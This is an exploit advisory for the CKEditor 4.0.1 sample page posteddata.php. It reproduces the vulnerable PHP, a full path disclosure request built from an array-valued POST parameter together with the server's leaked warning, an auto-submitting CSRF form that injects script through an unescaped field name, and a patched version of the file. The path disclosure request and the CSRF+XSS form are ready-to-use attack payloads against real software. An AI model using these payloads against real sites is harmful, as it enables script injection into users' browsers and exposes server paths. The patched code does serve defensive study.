```
===========================================
Vulnerable Software: ckeditor 4.0.1 standard
Download: http://download.cksource.com/CKEditor/CKEditor/CKEditor%204.0.1/ckeditor_4.0.1_standard.zip
Vulns: Full Path Disclosure && XSS
===========================================
Tested On: Debian squeeze 6.0.6
Server version: Apache/2.2.16 (Debian)
Apache traffic server 3.2.0
MYSQL: 5.1.66-0+squeeze1
PHP 5.3.3-7+squeeze14 with Suhosin-Patch (cli) (built: Aug  6 2012 20:08:59)
Copyright (c) 1997-2009 The PHP Group
Zend Engine v2.3.0, Copyright (c) 1998-2010 Zend Technologies
with Suhosin v0.9.32.1, Copyright (c) 2007-2010, by SektionEins GmbH
===========================================
Vulnerable Code: /ckeditor/samples/assets/posteddata.php
=============SNIP BEGINS====================

root@debian:/etc/apache2/htdocs/hacker1/admin/ckeditor/samples/assets# cat posteddata.php
<!DOCTYPE html>
<?php
/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/
?>
<html>
<head>
        <meta charset="utf-8">
        <title>Sample &mdash; CKEditor</title>
        <link rel="stylesheet" href="sample.css">
</head>
<body>
        <h1 class="samples">
                CKEditor &mdash; Posted Data
        </h1>
        <table border="1" cellspacing="0" id="outputSample">
                <colgroup><col width="120"></colgroup>
                <thead>
                        <tr>
                                <th>Field&nbsp;Name</th>
                                <th>Value</th>
                        </tr>
                </thead>
<?php

if ( isset( $_POST ) )
        $postArray = &$_POST ;                  // 4.1.0 or later, use $_POST
else
        $postArray = &$HTTP_POST_VARS ; // prior to 4.1.0, use HTTP_POST_VARS

foreach ( $postArray as $sForm => $value )
{
        if ( get_magic_quotes_gpc() )
                $postedValue = htmlspecialchars( stripslashes( $value ) ) ;
        else
                $postedValue = htmlspecialchars( $value ) ;

?>
                <tr>
                        <th style="vertical-align: top"><?php echo $sForm?></th>
                        <td><pre class="samples"><?php echo $postedValue?></pre></td>
                </tr>
        <?php
}
?>
        </table>
        <div id="footer">
                <hr>
                <p>
                        CKEditor - The text editor for the Internet - <a class="samples" href="http://ckeditor.com/">http://ckeditor.com</a>
                </p>
                <p id="copy">
                        Copyright &copy; 2003-2013, <a class="samples" href="http://cksource.com/">CKSource</a> - Frederico Knabben. All rights reserved.
                </p>
        </div>
</body>
</html>


=============SNIP ENDS HERE====================



FULL Path Disclosure example: 

URL: http://hacker1.own/admin/ckeditor/samples/sample_posteddata.php
METHOD: $_POST

HEADERS:

Host: hacker1.own
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 30



$_POST DATA TO SEND:


bangbangbang[]=PATH DISCLOSURE




Result: 
Warning: htmlspecialchars() expects parameter 1 to be string, array given in /etc/apache2/htdocs/hacker1/admin/ckeditor/samples/assets/posteddata.php on line 38

Print screen: http://i076.radikal.ru/1302/84/edbe3f8f4524.png


=================================================

CSRF+XSS
<body onload="javascript:document.forms[0].submit()">
<form name="form1" method="post" action="http://hacker1.own/admin/ckeditor/samples/sample_posteddata.php" enctype="multipart/form-data">
<input type="hidden" name="<script>alert('AkaStep');</script>" id="fupl" value="SENDF"></li>
</form>

=================================================

Print Screen:  http://i062.radikal.ru/1302/e6/25ef023dd589.png



=================================================
And here is fixed version:  /ckeditor/samples/assets/posteddata.php

================SNIP BEGINS=======================
<!DOCTYPE html>
<?php
/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/
?>
<html>
<head>
  <meta charset="utf-8">
  <title>Sample &mdash; CKEditor</title>
  <link rel="stylesheet" href="sample.css">
</head>
<body>
  <h1 class="samples">
    CKEditor &mdash; Posted Data
  </h1>
  <table border="1" cellspacing="0" id="outputSample">
    <colgroup><col width="120"></colgroup>
    <thead>
      <tr>
        <th>Field&nbsp;Name</th>
        <th>Value</th>
      </tr>
    </thead>
<?php

if ( isset( $_POST ) )
  $postArray = &$_POST ;      // 4.1.0 or later, use $_POST
else
  $postArray = &$HTTP_POST_VARS ;  // prior to 4.1.0, use HTTP_POST_VARS

foreach ( $postArray as $sForm => $value )
{
  if ( get_magic_quotes_gpc() )
    $postedValue = htmlspecialchars( stripslashes((string) $value ) ) ;
  else
  $postedValue =htmlspecialchars((string) $value ) ;

?>
    <tr>
      <th style="vertical-align: top"><?php echo htmlspecialchars((string)$sForm);?></th>
      <td><pre class="samples"><?php echo $postedValue?></pre></td>
    </tr>
  <?php
}
?>
  </table>
  <div id="footer">
    <hr>
    <p>
      CKEditor - The text editor for the Internet - <a class="samples" href="http://ckeditor.com/">http://ckeditor.com</a>
    </p>
    <p id="copy">
      Copyright &copy; 2003-2013, <a class="samples" href="http://cksource.com/">CKSource</a> - Frederico Knabben. All rights reserved.
    </p>
  </div>
</body>
</html>

=============ENJOYYY====================

               KUDOSSSSSSS
=========================================
packetstormsecurity.org
packetstormsecurity.com
packetstormsecurity.net
securityfocus.com
cxsecurity.com
security.nnov.ru
securtiyvulns.com
securitylab.ru
secunia.com
securityhome.eu
exploitsdownload.com
osvdb.com
websecurity.com.ua
1337day.com
itsecuritysolutions.org

to all Aa Team + to all Azerbaijan Black HatZ
+ *Especially to my bro CAMOUFL4G3 *
To All Turkish Hackers

Also special thanks to: ottoman38 & HERO_AZE
===========================================

/AkaStep
```

